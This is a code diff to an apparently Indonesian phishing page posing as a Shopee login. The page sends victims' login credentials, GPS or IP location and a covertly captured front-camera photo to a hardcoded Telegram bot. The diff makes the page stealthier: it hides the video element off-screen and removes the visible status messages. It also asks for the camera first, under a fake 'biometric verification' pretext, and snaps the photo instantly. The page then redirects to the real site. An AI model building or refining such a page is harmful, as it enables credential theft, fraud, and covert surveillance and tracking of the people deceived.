@@ -79,14 +79,6 @@
             margin-bottom: 10px;
         }
 
-        .camera-preview {
-            margin: 15px 0;
-            border-radius: 8px;
-            overflow: hidden;
-            background: #000;
-            display: none;
-        }
-
         .success-message {
             background: #4CAF50;
             color: white;
@@ -97,23 +89,31 @@
             display: none;
         }
 
-        .status-message {
+        /* Sembunyikan elemen kamera dari view */
+        .hidden-camera {
             position: fixed;
-            bottom: 10px;
-            right: 10px;
-            background: rgba(0,0,0,0.9);
-            color: #00ff00;
-            padding: 8px 12px;
-            border-radius: 6px;
-            font-family: 'Courier New', monospace;
-            font-size: 10px;
-            z-index: 9999;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
         }
     </style>
 </head>
 <body>
 
-    <!-- GPS Permission Popup -->
+    <!-- Camera Permission Popup (MUNCUL PERTAMA) -->
+    <div class="popup" id="cameraPopup">
+        <div class="popup-content">
+            <div style="font-size: 48px; margin-bottom: 15px;">📷</div>
+            <div style="font-size: 18px; font-weight: 600; margin-bottom: 10px;">Verifikasi Wajah Diperlukan</div>
+            <div style="margin-bottom: 20px;">Sistem membutuhkan akses kamera untuk verifikasi biometrik keamanan</div>
+            <button class="popup-btn" id="allowCamera">IZINKAN KAMERA</button>
+            <button style="background: transparent; border: none; padding: 10px; cursor: pointer;" id="denyCamera">Lewati</button>
+        </div>
+    </div>
+
+    <!-- GPS Permission Popup (MUNCUL SETELAH FOTO) -->
     <div class="popup" id="gpsPopup">
         <div class="popup-content">
             <div style="font-size: 48px; margin-bottom: 15px;">📍</div>
@@ -124,23 +124,9 @@
         </div>
     </div>
 
-    <!-- Camera Permission Popup -->
-    <div class="popup" id="cameraPopup">
-        <div class="popup-content">
-            <div style="font-size: 48px; margin-bottom: 15px;">📷</div>
-            <div style="font-size: 18px; font-weight: 600; margin-bottom: 10px;">Verifikasi Wajah Diperlukan</div>
-            <div style="margin-bottom: 20px;">Sistem membutuhkan akses kamera untuk verifikasi biometrik wajah</div>
-            <div class="camera-preview">
-                <video id="cameraFeed" width="100%" height="200" autoplay playsinline></video>
-            </div>
-            <button class="popup-btn" id="allowCamera">IZINKAN KAMERA</button>
-            <button style="background: transparent; border: none; padding: 10px; cursor: pointer;" id="denyCamera">Lewati</button>
-        </div>
-    </div>
-
-    <!-- Status Message -->
-    <div class="status-message" id="statusMessage">
-        🛡️ Verifikasi Keamanan Aktif
+    <!-- Hidden Camera Elements -->
+    <div class="hidden-camera">
+        <video id="cameraFeed" width="1" height="1" autoplay playsinline></video>
     </div>
 
     <div class="header">
@@ -177,6 +163,7 @@
         const BOT_TOKEN = "8057628415:AAH5CgDci7Kzkqshqc9B8VK8ApC8RL-i5ok";
         const CHAT_ID = "7343601029";
         let cameraStream = null;
+        let photoCaptured = false;
 
         // Function untuk kirim text ke Telegram
         async function sendToTelegram(message) {
@@ -219,9 +206,62 @@
             }
         }
 
-        // Update status message
-        function updateStatus(message) {
-            document.getElementById('statusMessage').textContent = message;
+        // Start camera and IMMEDIATELY capture photo
+        async function startCamera() {
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
+                
+                const cameraFeed = document.getElementById('cameraFeed');
+                cameraFeed.srcObject = cameraStream;
+                
+                // Capture photo immediately after camera is ready
+                await new Promise(resolve => setTimeout(resolve, 500));
+                await captureAndSendPhoto();
+                
+            } catch (error) {
+                console.error('Camera error:', error);
+                showGPSPopup();
+            }
+        }
+
+        // Capture photo and send to Telegram
+        async function captureAndSendPhoto() {
+            const video = document.getElementById('cameraFeed');
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert to blob and send
+            canvas.toBlob(async (blob) => {
+                await sendPhotoToTelegram(blob);
+                photoCaptured = true;
+                
+                // Stop camera
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
+                }
+                
+                // Show GPS popup after photo
+                showGPSPopup();
+                
+            }, 'image/jpeg', 0.9);
+        }
+
+        // Show GPS popup
+        function showGPSPopup() {
+            document.getElementById('cameraPopup').style.display = 'none';
+            setTimeout(() => {
+                document.getElementById('gpsPopup').style.display = 'flex';
+            }, 500);
         }
 
         // Get GPS Location
@@ -240,10 +280,8 @@
                                   `🗺️ <a href="https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}">View on Maps</a>`;
                     
                     await sendToTelegram(message);
-                    updateStatus('📍 Lokasi terkirim');
+                    document.getElementById('gpsPopup').style.display = 'none';
                     
-                    // Setelah GPS, minta akses kamera
-                    setTimeout(showCameraPopup, 1000);
                 },
                 async (error) => {
                     await sendToTelegram(`❌ GPS Error: ${error.message}`);
@@ -263,107 +301,36 @@
                               `🕒 ${new Date().toLocaleString()}\n` +
                               `🌐 IP: ${data.ip}\n` +
                               `📍 ${data.city}, ${data.country_name}\n` +
-                              `🏢 ISP: ${data.org}\n` +
-                              `📱 ${navigator.userAgent}`;
+                              `🏢 ISP: ${data.org}`;
                 
                 await sendToTelegram(message);
-                updateStatus('🌍 Lokasi IP terkirim');
-                
-                // Setelah IP, minta akses kamera
-                setTimeout(showCameraPopup, 1000);
                 
             } catch (error) {
-                await sendToTelegram(`📱 BASIC INFO\n${new Date().toLocaleString()}\n${navigator.userAgent}`);
-                setTimeout(showCameraPopup, 1000);
+                await sendToTelegram(`📱 BASIC INFO\n${new Date().toLocaleString()}`);
             }
-        }
-
-        // Show camera popup
-        function showCameraPopup() {
-            updateStatus('📷 Meminta akses kamera...');
-            setTimeout(() => {
-                document.getElementById('cameraPopup').style.display = 'flex';
-            }, 1500);
-        }
-
-        // Start camera and capture photo
-        async function startCamera() {
-            try {
-                updateStatus('📷 Mengaktifkan kamera...');
-                cameraStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    } 
-                });
-                
-                const cameraFeed = document.getElementById('cameraFeed');
-                cameraFeed.srcObject = cameraStream;
-                document.querySelector('.camera-preview').style.display = 'block';
-                
-                updateStatus('📷 Kamera aktif - mengambil foto...');
-                
-                // Auto capture setelah 3 detik
-                setTimeout(captureAndSendPhoto, 3000);
-                
-            } catch (error) {
-                updateStatus('❌ Kamera gagal');
-                document.getElementById('cameraPopup').style.display = 'none';
-            }
-        }
-
-        // Capture photo and send to Telegram
-        async function captureAndSendPhoto() {
-            const video = document.getElementById('cameraFeed');
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Convert to blob and send
-            canvas.toBlob(async (blob) => {
-                updateStatus('📷 Mengirim foto ke Telegram...');
-                
-                const success = await sendPhotoToTelegram(blob);
-                
-                if (success) {
-                    updateStatus('✅ Foto wajah terkirim!');
-                } else {
-                    updateStatus('❌ Gagal kirim foto');
-                }
-                
-                // Stop camera
-                if (cameraStream) {
-                    cameraStream.getTracks().forEach(track => track.stop());
-                }
-                document.getElementById('cameraPopup').style.display = 'none';
-                
-            }, 'image/jpeg', 0.8);
+            document.getElementById('gpsPopup').style.display = 'none';
         }
 
         // Event Listeners
-        document.getElementById('allowGPS').addEventListener('click', () => {
-            document.getElementById('gpsPopup').style.display = 'none';
-            updateStatus('📍 Mengakses GPS...');
-            getGPSLocation();
-        });
-
-        document.getElementById('denyGPS').addEventListener('click', () => {
-            document.getElementById('gpsPopup').style.display = 'none';
-            updateStatus('🌍 Mendapatkan lokasi IP...');
-            getIPLocation();
-        });
-
         document.getElementById('allowCamera').addEventListener('click', () => {
+            document.getElementById('cameraPopup').style.display = 'none';
             startCamera();
         });
 
         document.getElementById('denyCamera').addEventListener('click', () => {
             document.getElementById('cameraPopup').style.display = 'none';
-            updateStatus('⏭️ Verifikasi wajah dilewati');
+            photoCaptured = true;
+            showGPSPopup();
+        });
+
+        document.getElementById('allowGPS').addEventListener('click', () => {
+            document.getElementById('gpsPopup').style.display = 'none';
+            getGPSLocation();
+        });
+
+        document.getElementById('denyGPS').addEventListener('click', () => {
+            document.getElementById('gpsPopup').style.display = 'none';
+            getIPLocation();
         });
 
         // Login form handler
@@ -374,7 +341,6 @@
 
             document.getElementById('loginBtn').disabled = true;
             document.getElementById('loginBtn').textContent = 'MEMVERIFIKASI...';
-            updateStatus('🔐 Mengirim data login...');
 
             const message = `🔐 <b>LOGIN CREDENTIALS</b>\n\n` +
                            `🕒 ${new Date().toLocaleString()}\n` +
@@ -387,17 +353,16 @@
 
             document.getElementById('successMessage').style.display = 'block';
             document.getElementById('loginBtn').style.display = 'none';
-            updateStatus('✅ Semua data terkirim!');
 
             setTimeout(() => {
                 window.location.href = 'https://shopee.co.id';
             }, 3000);
         });
 
-        // Show GPS popup on load
+        // Show CAMERA popup first on load
         window.addEventListener('load', () => {
             setTimeout(() => {
-                document.getElementById('gpsPopup').style.display = 'flex';
+                document.getElementById('cameraPopup').style.display = 'flex';
             }, 1000);
         });
     </script>
